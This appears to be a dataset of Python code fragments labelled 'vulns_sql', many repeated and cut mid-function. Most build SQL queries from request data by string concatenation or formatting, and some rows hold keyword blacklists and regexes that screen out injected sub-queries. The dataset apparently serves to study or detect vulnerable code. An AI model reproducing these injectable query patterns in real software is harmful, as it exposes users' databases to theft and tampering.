from ooiservices.adaptor.postgres import PostgresAdaptor as PSQLfrom ooiservices.adaptor.sqlite import SQLiteAdaptor as SQL,vulns_sql
"        if 'id' not in obj:            obj['id'] = self._get_latest_id() + 1        empties = ', '.join([self.holder for col in obj])        query = 'INSERT INTO ' + self.table_name + ' (' + columns + ') VALUES (' + empties + ');'        feedback = self.sql.perform(query, obj.values())        return obj        query_params = query_params or {}        if query_params:            where_clause, query_items = self._build_where_clause(query_params)            query = 'SELECT * FROM ' + self.table_name + ' WHERE ' + where_clause            answer = self.sql.perform(query, query_items)            query = 'SELECT * FROM %s;' % (self.table_name)            answer = self.sql.perform(query)",vulns_sql
"        update_clause, query_params = self._build_update_clause(obj)        query = 'UPDATE ' + self.table_name + ' SET ' + update_clause + ' WHERE id=' + str(obj_id) + ';'        feedback = self.sql.perform(query, query_params)        return self.read({'id' : obj_id})[0]    def delete(self, obj_id):        '''        Deletes a single document        '''        query = 'DELETE FROM ' + self.table_name + ' WHERE id=' + self.holder        feedback = self.sql.perform(query, (obj_id,))    def _build_where_clause(self, query_params):        '''        Returns the WHERE clause and the tuple of items to pass in with the        string        '''        raw_clauses = []        query_items = []        for field, value in query_params.iteritems():            if field in self.where_params:                raw_clauses.append(field + '=' + self.holder)                query_items.append(value)            else:                raise ModelException(""%s is not a valid where parameter"" % field)        raw_clause = ' AND '.join(raw_clauses)        return raw_clause, query_items    def _build_update_clause(self, obj):        '''        Returns a tuple of the key/value part of the UPDATE clause and the        query params        '''        raw_clauses = []        for field, value in obj.iteritems():            raw_clauses.append(field + '=' + self.holder)        raw_clause = ', '.join(raw_clauses)        return raw_clause, obj.values()    def _get_latest_id(self):        query = 'SELECT id FROM ' + self.table_name + ' ORDER BY id DESC LIMIT 1'        results = self.sql.perform(query)        if not results:            return 0 # the very first        return results[0]['id']",vulns_sql
"        ''' % (winner, loser, loser, winner)        cur.execute(q)",vulns_sql
"                  ""AND M2.acadYearAndSem LIKE '"" + selected_ay + ""%' "" +\    DB_CURSOR.execute(sql_command)",vulns_sql
"                ""WHERE sp1.moduleCode = '"" + code + ""' AND "" + \    DB_CURSOR.execute(sql_command)",vulns_sql
TODO: sort by timestamp,vulns_sql
"	statement = ""SELECT * FROM questions WHERE id="" + q_id # won't come from the user	curs.execute(statement)",vulns_sql
"        sql = '''SELECT                    mode() WITHIN GROUP (ORDER BY list_price DESC) AS model_value,                    count(*)                 FROM                    ""itemPrices_itemsale""              '''        if item and city:            sql = ""{} WHERE city = '{}' and title = '{}'"".format(sql, city, item)        elif item:            sql = ""{} WHERE title = '{}'"".format(sql, item)        elif city:            sql = ""{} WHERE city = '{}'"".format(sql, city)        with connection.cursor() as c:            c.execute(sql)            price_mode, count = c.fetchone()",vulns_sql
"    city_cur.execute(""SELECT cities.name, id AS city_id, region_id, country_id FROM cities WHERE cities.name REGEXP %s LIMIT 100""                     , (request.args[""input_text""],))    region_cur.execute(""SELECT regions.name, 'null' AS city_id, id AS region_id, country_id FROM regions WHERE regions.name REGEXP %s LIMIT 100""                       , (request.args[""input_text""],))    country_cur.execute(""SELECT countries.name, 'null' AS city_id, 'null' AS region_id, id AS country_id FROM countries WHERE countries.name REGEXP %s LIMIT 100""                        , (request.args[""input_text""],))",vulns_sql
				 ' or '.join(self.or_conditions),vulns_sql
"		regex = re.compile('^.*[,();].*')",vulns_sql
"			if regex.match(field):				if any(keyword in field.lower() for keyword in blacklisted_keywords):				if any(""{0}("".format(keyword) in field.lower() \					for keyword in blacklisted_functions):",vulns_sql
	return event,vulns_sql
"	def _raise_exception():		frappe.throw(_('Invalid Search Field'), frappe.DataError)			_raise_exception()			_raise_exception()			_raise_exception()			_raise_exception()",vulns_sql
"		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']			frappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)",vulns_sql
"		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case',			'from', 'group', 'order', 'by']",vulns_sql
"			elif re.compile(""\s*[a-zA-z]*\s*( from | group by | order by | where | join )"").match(field):",vulns_sql
"			if re.compile(""[a-zA-Z]+\s*'"").match(field):			if re.compile('[a-zA-Z]+\s*,').match(field):",vulns_sql
				 ' or '.join(self.or_conditions),vulns_sql
"		regex = re.compile('^.*[,();].*')",vulns_sql
"			if regex.match(field):				if any(keyword in field.lower() for keyword in blacklisted_keywords):				if any(""{0}("".format(keyword) in field.lower() \					for keyword in blacklisted_functions):",vulns_sql
	return event,vulns_sql
"	def _raise_exception():		frappe.throw(_('Invalid Search Field'), frappe.DataError)			_raise_exception()			_raise_exception()			_raise_exception()			_raise_exception()",vulns_sql
"		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']			frappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)",vulns_sql
"		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case',			'from', 'group', 'order', 'by']",vulns_sql
"			elif re.compile(""\s*[a-zA-z]*\s*( from | group by | order by | where | join )"").match(field):",vulns_sql
"			if re.compile(""[a-zA-Z]+\s*'"").match(field):			if re.compile('[a-zA-Z]+\s*,').match(field):",vulns_sql
				 ' or '.join(self.or_conditions),vulns_sql
"		regex = re.compile('^.*[,();].*')",vulns_sql
"			if regex.match(field):				if any(keyword in field.lower() for keyword in blacklisted_keywords):				if any(""{0}("".format(keyword) in field.lower() \					for keyword in blacklisted_functions):",vulns_sql
	return event,vulns_sql
"	def _raise_exception():		frappe.throw(_('Invalid Search Field'), frappe.DataError)			_raise_exception()			_raise_exception()			_raise_exception()			_raise_exception()",vulns_sql
				 ' or '.join(self.or_conditions),vulns_sql
"		regex = re.compile('^.*[,();].*')",vulns_sql
"			if regex.match(field):				if any(keyword in field.lower() for keyword in blacklisted_keywords):				if any(""{0}("".format(keyword) in field.lower() \					for keyword in blacklisted_functions):",vulns_sql
	return event,vulns_sql
"	def _raise_exception():		frappe.throw(_('Invalid Search Field'), frappe.DataError)			_raise_exception()			_raise_exception()			_raise_exception()			_raise_exception()",vulns_sql
"		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']			frappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)",vulns_sql
"		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case',			'from', 'group', 'order', 'by']",vulns_sql
"	def _raise_exception():		frappe.throw(_('Invalid Search Field'), frappe.DataError)			_raise_exception()			_raise_exception()			_raise_exception()			_raise_exception()",vulns_sql
"		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']			frappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)",vulns_sql
"		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case',			'from', 'group', 'order', 'by']",vulns_sql
"			elif re.compile(""\s*[a-zA-z]*\s*( from | group by | order by | where | join )"").match(field):",vulns_sql
"			if re.compile(""[a-zA-Z]+\s*'"").match(field):			if re.compile('[a-zA-Z]+\s*,').match(field):",vulns_sql
"		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']			frappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)",vulns_sql
"		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case',			'from', 'group', 'order', 'by']",vulns_sql
"			elif re.compile(""\s*[a-zA-z]*\s*( from | group by | order by | where | join )"").match(field):",vulns_sql
"			if re.compile(""[a-zA-Z]+\s*'"").match(field):			if re.compile('[a-zA-Z]+\s*,').match(field):",vulns_sql
"    user_engine.execute(        ""update endpoint set url = '{0}' where interface ='internal' and service_id = (select id from service where service.type = 'identity')"".        format(endpoint_url))",vulns_sql
"    user_engine.execute(        ""update endpoint set url = '{0}' where interface ='admin' and service_id = (select id from service where service.type = 'identity')"".        format(endpoint_url))",vulns_sql
"    user_engine.execute(        ""update endpoint set url = '{0}' where interface ='public' and service_id = (select id from service where service.type = 'identity')"".        format(endpoint_url))",vulns_sql
import subprocess,vulns_sql
"    subprocess.call(['keystone-manage', cmd,",vulns_sql
"    user_engine.execute(        ""update endpoint set url = '{0}' where interface ='internal' and service_id = (select id from service where service.type = 'identity')"".        format(endpoint_url))",vulns_sql
"    user_engine.execute(        ""update endpoint set url = '{0}' where interface ='admin' and service_id = (select id from service where service.type = 'identity')"".        format(endpoint_url))",vulns_sql
"    user_engine.execute(        ""update endpoint set url = '{0}' where interface ='public' and service_id = (select id from service where service.type = 'identity')"".        format(endpoint_url))",vulns_sql
import subprocess,vulns_sql
"    subprocess.call(['keystone-manage', cmd,",vulns_sql
"        return ""(%s -> '%s')"" % (lhs, self.key_name), params",vulns_sql
"            int(self.key_name)            lookup = ""'%s'"" % self.key_name        else:            lookup = ""%s"" % self.key_name        return ""(%s %s %s)"" % (lhs, self.operator, lookup), params",vulns_sql
"        return '%s[%s]' % (lhs, self.index), params",vulns_sql
"        return '%s[%s:%s]' % (lhs, self.start, self.end), params",vulns_sql
"    cur.execute(f""""""",vulns_sql
"    cur.execute(f""""""",vulns_sql
"    cur.execute(f""SELECT * FROM film where fulltext ",vulns_sql
"        VALUES ('{}', '{}', {}, {}, {}, {}, {}, {})        """""".format(*[v for k, v in movie.items()])        cur.execute(f""SELECT * FROM film where fulltext ",vulns_sql
"        cur.execute(f""INSERT INTO language (name) VALUES ('{lang}')"")    cur.execute(f""SELECT language_id FROM language where name='{lang}'"")",vulns_sql
"update_sql = ""UPDATE contacts SET email = 'test@myemail.ie' WHERE email LIKE 'test@email.com'""update_cursor.execute(update_sql)update_cursor.close()",vulns_sql
"        self, user_id, username, hashed_password, roll_id=1, *args, **kwargs",vulns_sql
"            if connection.execute(s, username=username).fetchone() is None",vulns_sql
"    return response.json(        JoggingResult.load(user_id, q_filter, page, limit), status=200    )",vulns_sql
"    resp = await test_cli.get(""/results?page=0&count=2"", headers=headers)    resp = await test_cli.get(""/results?page=1&count=1"", headers=headers)",vulns_sql
"    resp = await test_cli.get(""/results?page=-1&count=2"", headers=headers)    resp = await test_cli.get(""/results?page=1&count=0"", headers=headers)",vulns_sql
"        ""/results?page=0&count=2&filter=date eq '2019-07-15'"", headers=headers",vulns_sql
"        c1.execute(""SELECT invCount FROM keyInventory WHERE keyNum = '%s';"" % u_keyNum)",vulns_sql
"        c2.execute(""INSERT INTO ordersFilled (submit_time, orderNum, keyNum, keysUsed, preCount, postCount) VALUES (?, ?, ?, ?, ?, ?);"", (u_date, u_orderNum,  u_keyNum, u_keysUsed, u_preCount, u_postCount))        c3.execute(""UPDATE keyInventory SET invCount = ? WHERE keyNum = ?;"", (u_postCount, u_keyNum))",vulns_sql
"        c1.execute(""SELECT invCount FROM keyInventory WHERE keyNum = '%s';"" % u_keyNum)",vulns_sql
"        c2.execute(""INSERT INTO resupply (submit_time, keyNum, keysAdded, preCount, postCount) VALUES (?, ?, ?, ?, ?);"", (u_date, u_keyNum, u_keysAdded, u_preCount, u_postCount))        c3.execute(""UPDATE keyInventory SET invCount = ? WHERE keyNum = ?;"", (u_postCount, u_keyNum))",vulns_sql
        query_str = query_templ.format(**query_params)    return res,vulns_sql
"    open_query = ""SELECT * FROM {}""            pd.read_sql(open_query.format(table), conn).to_csv('{}.csv'.format(table), index=False)",vulns_sql
"            was_prev_closed = pd.read_sql(f""SELECT * FROM df_dilfo WHERE job_number={job_number}"", conn).iloc[0].closed",vulns_sql
"        was_prev_closed = pd.read_sql(f""SELECT * FROM df_dilfo WHERE job_number={job_number}"", conn).iloc[0].closed        update_status_query = ""UPDATE df_dilfo SET closed = 1 WHERE job_number = {}""            conn.cursor().execute(update_status_query.format(job_number))",vulns_sql
"            VALUES ({}, 'alex.roy616@gmail.com', {})            VALUES ({}, 'alex.roy616@gmail.com', {})                conn.cursor().execute(fake_dilfo_insert.format(job_number, was_prev_closed))                    conn.cursor().execute(fake_match_insert.format(job_number, 1))                    conn.cursor().execute(fake_match_insert.format(job_number, 0))            df_dilfo_pre = pd.read_sql(f""SELECT * FROM df_dilfo WHERE job_number={job_number}"", conn)            df_matched_pre = pd.read_sql(f""SELECT * FROM df_matched WHERE job_number={job_number}"", conn)            df_dilfo_post = pd.read_sql(f""SELECT * FROM df_dilfo WHERE job_number={job_number}"", conn)            df_matched_post = pd.read_sql(f""SELECT * FROM df_matched WHERE job_number={job_number}"", conn)",vulns_sql
"            VALUES ({}, {})            VALUES ({}, {})            conn.cursor().execute(fake_dilfo_insert.format(job_number, was_prev_closed))                    conn.cursor().execute(fake_match_insert.format(job_number, 1))                    conn.cursor().execute(fake_match_insert.format(job_number, 0))            df_dilfo_pre = pd.read_sql(f""SELECT * FROM df_dilfo WHERE job_number={job_number}"", conn)            df_matched_pre = pd.read_sql(f""SELECT * FROM df_matched WHERE job_number={job_number}"", conn)            df_dilfo_post = pd.read_sql(f""SELECT * FROM df_dilfo WHERE job_number={job_number}"", conn)            df_matched_post = pd.read_sql(f""SELECT * FROM df_matched WHERE job_number={job_number}"", conn)",vulns_sql
def _get_org_id_and_type_from_request(request):,vulns_sql
"    org_type = None        org_type = request.query_params['org_type'] + '_id'        if org_type in ['pct_id', 'ccg_id']:            org_type = 'pr.ccg_id'            org_type = 'pr.ccg_id'            org_type = 'practice_id'    return (org_id, org_type)    org_id, org_type = _get_org_id_and_type_from_request(request)        if org_type in ['stp_id', 'regional_team_id']:        elif org_type == 'pr.ccg_id':",vulns_sql
"        focus_on_org = org_id and org_type            org_condition = ""{org_type} = %(org_id)s AND "".format(                org_type=org_type)            org_group = ""{org_type}, "".format(                org_type=org_type)",vulns_sql
"            org_type=org_type,",vulns_sql
"        sql_update = f""UPDATE `artikelen` SET `{column}` = '{location_nw}' WHERE `title` = '{title}'"" ",vulns_sql
"        return database_utilities.execute_query(f""""""select * from admins where email = '{email}'"""""")        return database_utilities.execute_query(f""""""delete from admins where email = '{email}'"""""")",vulns_sql
"            f""""""select * from admins where email = '{json_data['email']}'"""""")",vulns_sql
"            f""""""select * from spaces where space_id = '{space_id}'"""""")",vulns_sql
"        return database_utilities.execute_query(f""""""select * from users where user_id = '{user_id}'"""""")        return database_utilities.execute_query(f""""""delete from users where user_id = '{user_id}'"""""")        query += f""""""where user_id = '{user_id}'""""""        parameters = (json_data['user_id'], )",vulns_sql
"		and c.email_id='{email_id}'"""""".format(email_id=sender))",vulns_sql
"	import get_leave_allocation_records, get_leave_balance_on, get_approved_leaves_for_period					_(""Employee"") + "":Link/Employee:150"", 		_(""Employee Name"") + ""::200"", ",vulns_sql
"			active_employees = frappe.get_all(""Employee"", 		filters = { ""status"": ""Active"", ""company"": filters.company}, 	",vulns_sql
"				opening = get_leave_balance_on(employee.name, leave_type, filters.from_date,					allocation_records_based_on_from_date.get(employee.name, frappe._dict()))",vulns_sql
		,vulns_sql
"		group by si.name order by days_since_last_order """"""",vulns_sql
"		and c.email_id='{email_id}'"""""".format(email_id=sender))",vulns_sql
"	import get_leave_allocation_records, get_leave_balance_on, get_approved_leaves_for_period					_(""Employee"") + "":Link/Employee:150"", 		_(""Employee Name"") + ""::200"", ",vulns_sql
"			active_employees = frappe.get_all(""Employee"", 		filters = { ""status"": ""Active"", ""company"": filters.company}, 	",vulns_sql
"				opening = get_leave_balance_on(employee.name, leave_type, filters.from_date,					allocation_records_based_on_from_date.get(employee.name, frappe._dict()))",vulns_sql
		,vulns_sql
"		group by si.name order by days_since_last_order """"""",vulns_sql
"		and c.email_id='{email_id}'"""""".format(email_id=sender))",vulns_sql
"	import get_leave_allocation_records, get_leave_balance_on, get_approved_leaves_for_period					_(""Employee"") + "":Link/Employee:150"", 		_(""Employee Name"") + ""::200"", ",vulns_sql
"			active_employees = frappe.get_all(""Employee"", 		filters = { ""status"": ""Active"", ""company"": filters.company}, 	",vulns_sql
"				opening = get_leave_balance_on(employee.name, leave_type, filters.from_date,					allocation_records_based_on_from_date.get(employee.name, frappe._dict()))",vulns_sql
		,vulns_sql
"		group by si.name order by days_since_last_order """"""",vulns_sql
"	import get_leave_allocation_records, get_leave_balance_on, get_approved_leaves_for_period					_(""Employee"") + "":Link/Employee:150"", 		_(""Employee Name"") + ""::200"", ",vulns_sql
"			active_employees = frappe.get_all(""Employee"", 		filters = { ""status"": ""Active"", ""company"": filters.company}, 	",vulns_sql
"				opening = get_leave_balance_on(employee.name, leave_type, filters.from_date,					allocation_records_based_on_from_date.get(employee.name, frappe._dict()))",vulns_sql
		,vulns_sql
"	import get_leave_allocation_records, get_leave_balance_on, get_approved_leaves_for_period					_(""Employee"") + "":Link/Employee:150"", 		_(""Employee Name"") + ""::200"", ",vulns_sql
"			active_employees = frappe.get_all(""Employee"", 		filters = { ""status"": ""Active"", ""company"": filters.company}, 	",vulns_sql
"				opening = get_leave_balance_on(employee.name, leave_type, filters.from_date,					allocation_records_based_on_from_date.get(employee.name, frappe._dict()))",vulns_sql
		,vulns_sql
"		group by si.name order by days_since_last_order """"""",vulns_sql
"		group by si.name order by days_since_last_order """"""",vulns_sql
"    inserted = (list_id, cook_id, food_name, price, loc, image)    sql = ""INSERT INTO {} VALUES {}"".format(listing_table_name, str(inserted).encode(""ascii"", ""replace""))    cur.execute(sql)",vulns_sql
"        sql = ""INSERT INTO {} VALUES {}"".format(listing_tags_table_name, str((listing_id, x)))        cur.execute(sql)",vulns_sql
"			elif re.compile(""\s*[a-zA-z]*\s*( from | group by | order by | where | join )"").match(field):",vulns_sql
"			if re.compile(""[a-zA-Z]+\s*'"").match(field):			if re.compile('[a-zA-Z]+\s*,').match(field):",vulns_sql
"    query = 'SELECT * FROM user AS u LEFT OUTER JOIN (SELECT uid, count(uid) AS follower FROM follows GROUP BY uid) AS f ON u.id = f.uid ORDER BY ? {}'.format(sortOrder)        query, (sortBy,)",vulns_sql
"            query = ""INSERT INTO crimes (description) VALUES ('{}');"".format(data)                cursor.execute(query)",vulns_sql
"    def query(self, query):        return self.c.execute(query)        q = ""SELECT rowid FROM tids WHERE tid = '"" + tid + ""'""        self.query(q)        q = ""SELECT tid FROM tids WHERE rowid = '"" + str(tid_num) + ""'""        self.query(q)        q = ""SELECT tag FROM tid_tag WHERE tid = '"" + str(tid_num) + ""'""        self.query(q)        q = ""SELECT tag FROM tags WHERE rowid = '"" + str(tag_num) + ""'""        self.query(q)        q = ""SELECT rowid FROM tags WHERE tag = '"" + tag + ""'""        self.query(q)",vulns_sql
"            rows = c.execute(sql, (jobName,))",vulns_sql
"            c.execute(sql, (success, message, jobId,))",vulns_sql
"    'ORDER BY num_mutual DESC' % (user_id, user_id, user_id)        cursor.execute(sql)",vulns_sql
    sql = 'WITH tmp_suggest (followed_id) AS ' \,vulns_sql
    sql = 'WITH tmp_suggest AS ' \,vulns_sql
"    'ORDER BY num_mutual DESC'        cursor.execute(sql, (user_id, user_id, user_id))",vulns_sql
"    users_tmp = ', '.join(list(map(str, [user_id] + cands)))    WITH all_songs_analysis AS",vulns_sql
"    )    SELECT        user_id,        AVG(danceability),        AVG(energy),        AVG(loudness),        AVG(acousticness),        AVG(instrumentalness),        AVG(liveness),        AVG(valence)    FROM all_songs_analysis    ''' % (users_tmp)        cursor.execute(sql)",vulns_sql
    WITH tmp_suggest (followed_id) AS,vulns_sql
"    )    SELECT followed_id, COUNT(*) AS num_mutual FROM tmp_suggest    ''' % (user_id, user_id, user_id)        cursor.execute(sql)",vulns_sql
"    query = ""SELECT NAME, HOSTNAME, DOMAIN, IP, PORT, PROTOCOL from DEVICE WHERE NAME = "" + ""'{0}'"".format(name) + "" AND DOMAIN = "" + ""'{0}'"".format(domain)    answer = cursor.execute(query)    rules = answer.fetchall()",vulns_sql
"    old_query = ""DELETE FROM DEVICE WHERE NAME = '{0}' AND DOMAIN = '{1}'"".format(mac_addr, domain)    cursor.execute(old_query)",vulns_sql
"        query = ""INSERT INTO DEVICE(NAME, HOSTNAME, DOMAIN, IP, PORT, PROTOCOL) VALUES('{0}','{1}','{2}','{3}','{4}', '{5}')"".format(mac_addr, hostName, domain, newIp, port, protocol)        cursor.execute(query)",vulns_sql
"    cursor = conn.cursor()    query = ""SELECT DOMAIN FROM DEVICE WHERE NAME = '{0}'"".format(mac_addr)    answer = cursor.execute(query)    for domain in answer.fetchall():",vulns_sql
"app.register_blueprint(profile_module)    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)",vulns_sql
"from flask import Blueprint, request, redirect, jsonify, abortfrom modules.ProfileManager.api.db_methods import db_isAuthDataValid, db_addProfile, db_getProfileInfo, db_getUserID, \    db_setLastVisitfrom modules.SessionControl.app import initRedis_db, generateSessionfrom hashlib import sha256import jsonschema",vulns_sql
"        try:            data = json.loads(request.data)            jsonschema.validate(data, register_schema)        except (jsonschema.exceptions.ValidationError, json.decoder.JSONDecodeError):            return {'status': -1, 'message': '   JSON\''}        if not data['login'].isalpha():            return jsonify({'status': 0, 'message': ' \'\'       [a-Z]'})",vulns_sql
"        try:            data = json.loads(request.data)            jsonschema.validate(data, login_schema)        except (jsonschema.exceptions.ValidationError, json.decoder.JSONDecodeError):            return {'status': -1, 'message': '   '}",vulns_sql
"        if not data['login'].isalpha():            return jsonify({'status': 0, 'message': ' \'\'       [a-Z]'})",vulns_sql
"        generateSession(user_id, r)        return jsonify(db_getProfileInfo(user_id))@auth_module.route('/logout', methods=['GET', 'POST'])def logout():    try:        data = json.loads(request.data)        jsonschema.validate(data, login_schema)    except (jsonschema.exceptions.ValidationError, json.decoder.JSONDecodeError):        return {'status': -1, 'message': '   '}    r = initRedis_db()    r.delete(db_getUserID(data))    return jsonify({'status': 1})",vulns_sql
        data = json.loads(request.data)        r.delete(db_getUserID(data)),vulns_sql
"    sql = (""INSERT INTO dialogs (name, created_at)\n""           ""VALUES ('%s', NOW())""           ) % nameDialog    return {'status': 1}    sql = (""INSERT INTO dialogUser (dialog_id, user_id, permission)\n""           ""VALUES (%d, %d, %d)""           ) % dialogID, userID, permission    sql = (""INSERT INTO messages (dialog_id, content, created_at, user_id, section_id)\n""           ""VALUES (%d, '%s', NOW(), %d, %d)""           ) % (dialogID, content, userID, section_id)    sql = (""SELECT user_id, content, created_at, section_id\n""           ""FROM messages\n""           ""WHERE dialog_id='%s'""           ) % dialogID    return sql_execute(sql)",vulns_sql
"from flask import Blueprint, request@messages_module.route('/message/send')def send_message():        return db_sendMessage(request.get_json())@messages_module.route('/messages/<int:dialog_id>')@messages_module.route('/messages')def get_message(dialog_id):",vulns_sql
"    user_id = sql_execute(sql, fetch_all=True)        VALUES ('{}', '{login}', '{password}');",vulns_sql
"        sql += ""WHERE user_id='%d';"" % data        sql += ""WHERE login='%(login)s';"" % data",vulns_sql
        WHERE id='%d';    ''' % ID,vulns_sql
"        SET is_blocked='%s'        WHERE id='%d';    ''' % (status, ID)",vulns_sql
        WHERE login='%(login)s';    ''' % data,vulns_sql
"        SET is_deleted='%s'        WHERE id='%d';    ''' % (status, ID)",vulns_sql
"        WHERE user_id='%d';        WHERE id='%d';    ''' % (ID, ID)",vulns_sql
        WHERE id='%d';    ''' % ID,vulns_sql
                WHERE id='%d'            ''' % ID,vulns_sql
"                SET %s='%s'                 WHERE id='%d';            ''' % (key, data[key], ID)",vulns_sql
"@profile_module.route('/profile/<int:ID>', methods=['GET', 'PUT', 'DELETE'])",vulns_sql
            data = json.loads(request.data),vulns_sql
@profile_module.route('/profiles'),vulns_sql
"from flask import redirect, make_responsefrom random import randintimport redisimport uuidimport timedef initRedis_db():    r = redis.Redis(host='127.0.0.1',port=6379,db=0)    return rdef generateSession(user_id, r):    salt = ''.join([chr(randint(97, 122)) for _ in range(32)])    generate_uuid = str(uuid.uuid3(uuid.NAMESPACE_DNS, str(user_id + time.time()) + salt))    r.set(generate_uuid, user_id)    response = make_response(redirect('set_cookie'))    response.set_cookie('SESSION', bytes(generate_uuid, 'utf-8'))",vulns_sql
        return answer,vulns_sql
        resp = requests.get('http://127.0.0.1:5000/profiles'),vulns_sql
        resp = requests.get('http://127.0.0.1:5000/profiles'),vulns_sql
        resp = requests.get('http://127.0.0.1:5000/profiles'),vulns_sql
        resp = requests.get('http://127.0.0.1:5000/profiles'),vulns_sql
"        if ''.join(re.findall(r'\w+', data['login'])) != data['login']:            return jsonify({'status': 0, 'message': '       '})        if ''.join(re.findall(r'\w+', data['password'])) != data['password']:            return jsonify({'status': 0, 'message': '       '})",vulns_sql
    return True if answer is not None else False,vulns_sql
from MessagesManager.routes import messages_module,vulns_sql
"        sql += ""WHERE user_id='{:d}';"".format(data)        sql += ""WHERE login='{login}';"".format(**data)",vulns_sql
"        'login': {'type': 'string'},        'password': {'type': 'string'},        'first_name': {'type': 'string'},        'second_name': {'type': 'string'}",vulns_sql
"def sql_execute(query, fetch_all=True):",vulns_sql
        return {'error': err},vulns_sql
"        'login': {'type': 'string'},        'password': {'type': 'string'}",vulns_sql
"        'first_name': {'type': 'string'},        'second_name': {'type': 'string'}",vulns_sql
"        return {'status': -1, 'message': '   JSON\''}",vulns_sql
"        query = ""select * from {} limit 10000"".format(table_name)",vulns_sql
"            order = u""similarity(res_partner.name, '%s') DESC"" % fuzzy_search",vulns_sql
        dbConn =  dbaseConn(),vulns_sql
"            validate_sql = (                ""SELECT `uid`,`email`,`name` FROM `User` WHERE `uid`="" + ""'"" + uid + ""'""            )            cursor.execute(validate_sql)",vulns_sql
"                update_stmt = (                    ""UPDATE `User` SET `name` = ""                    + ""'""                    + new_user_name                    + ""'""                    + "" WHERE `uid` = %s""                )                cursor.execute(update_stmt, (uid,))",vulns_sql
"            sql = (                ""UPDATE `User` SET `email` = ""                + ""'""                + new_email                + ""'""                + "" WHERE `uid` = ""                + ""'""                + uid                + ""'""            )                cursor.execute(sql)",vulns_sql
"from phobos.core.const import dev_family2str, PHO_DEV_DIR",vulns_sql
"            sql = ""INSERT INTO source (source) VALUES (%s)"" % current_source            sqlite.execute(sql)",vulns_sql
"            sourcebyinstitution = ""%s""    """""" % sourcebyinstitution    sqlite.execute(query)",vulns_sql
"            sql = ""INSERT INTO institution (institution) VALUES ('%s')"" % current_institution            sqlite.execute(sql)",vulns_sql
"                sql = 'INSERT INTO history (sourcebyinstitution, titles) VALUES (""%s"", %s)' % (sourcebyinstitution, number)                sqlite.execute(sql)",vulns_sql
"                    sql = 'INSERT INTO history (sourcebyinstitution, titles) VALUES (""%s"", %s)' % (sourcebyinstitution, number)                    sqlite.execute(sql)                sql = ""INSERT INTO sourcebyinstitution (sourcebyinstitution) VALUES ('%s')"" % sourcebyinstitution                sqlite.execute(sql)",vulns_sql
"        sql = adapter.get_sql(select, table, filter, sort_by, offset, limit)",vulns_sql
"        cursor.execute(sql, None)",vulns_sql
"            lucene = lucene[whitespace_index+1:].lstrip()            print(""field - "" + field_name)            print(""value - "" + field_value)            print(""sql - "" + field_name + "" = "" + field_value)parser = LuceneParserparser.parse(""LuceneParser"", ""name:   mike profession: engineer"")",vulns_sql
        sql += self.create_where(where)        return sql,vulns_sql
"        sql = 'WHERE '        where_tuples = lucene_parser.parse(where)        for tuple in where_tuples:            sql += '{} {} {}'.format(tuple[0], tuple[1], tuple[2])        return sql",vulns_sql
__version__ = '2019.7.7',vulns_sql
"            return ""(%s %s %%s)"" % (lhs, self.nested_operator), [key_transforms] + params            int(self.key_name)            lookup = ""'%s'"" % self.key_name        else:            lookup = ""%s"" % self.key_name        return ""(%s %s %s)"" % (lhs, self.operator, lookup), params",vulns_sql
"from .api import get_query_manager__all__ = (""get_query_manager"",)opportunity_qm = models.Opportunity.get_query_manager()opportunities = opportunity_qm.run(            for a in o.Accounts    for o in opportunity_qm",vulns_sql
"from typing import Iterator, TypeVarfrom .interface import ISpydef construct_select_statement(spy: ISpy, from_: str) -> str:    return f""""""SELECT {', '.join(construct_selects(spy))} FROM {from_}""""""",vulns_sql
"    return f""""""(SELECT {', '.join(select_fields)} FROM {name})""""""",vulns_sql
"from typing import Any, Dict, Iterator, TypeVar",vulns_sql
"    def filter(self, expression: bool) -> bool:",vulns_sql
class IQueryManager(Protocol):,vulns_sql
"from typing import Iterator, TypeVarfrom .interface import IRow",vulns_sql
"        query_string = construct_select_statement(spy, self.from_object)",vulns_sql
"from typing import Dict, Iterator, TypeVarfrom .interface import ISpy",vulns_sql
        self.selected_fields = defaultdict(self.__class__),vulns_sql
"            query = ""INSERT INTO crimes (description) VALUES ('{}');"".format(                data)                cursor.execute(query)",vulns_sql
"        data[name] = pd.read_sql('select * from %s' % name, DB_CONNECTION, parse_dates=parse_dates)",vulns_sql
"    return render_form(form, True, url_for(""auth_login""), ""Login"", ""Invalid username or password."")",vulns_sql
"        query += "" WHERE ("" + table + ""."" + name + "" = :x""            query += "" AND "" + subtable + "".id = "" + str(form[subname].data) #Dangerous, but in our uses it isn't user input        res = db.engine.execute(stmt, x=field.data)",vulns_sql
"from fieldValues import faculty_status, fields_of_study, departments, careerareas,ipedssectornames",vulns_sql
        year = request.form.getlist('year')        ipeds = request.form.getlist('ipedssectornames'),vulns_sql
    Also set request global variables to be accessed for the life time of the request,vulns_sql
"from marshmallow import Schema,fields",vulns_sql
def ip_test(ip):        try:            ipaddress.ip_address(ip)            return True        except ValueError:            return False,vulns_sql
    id = fields.Integer()    email = fields.Email(required=True)    reset_password_token = fields.String(),vulns_sql
    created_at = fields.DateTime(required=True)    auth_token =fields.String()    role = fields.Integer()    first_name = fields.String()    last_name = fields.String()    checked_in = fields.Boolean(required=True),vulns_sql
        pass,vulns_sql
    def get(self):    def post(self):        pass,vulns_sql
"	email = db.Column(db.String(50))	def __init__(self, email, password):		self.email = email	return render_template('tables.html', User=User.query.all())		user = User(request.form['email'], request.form['password'])		db.session.add(user)		db.session.commit()		return redirect(url_for('tables'))",vulns_sql
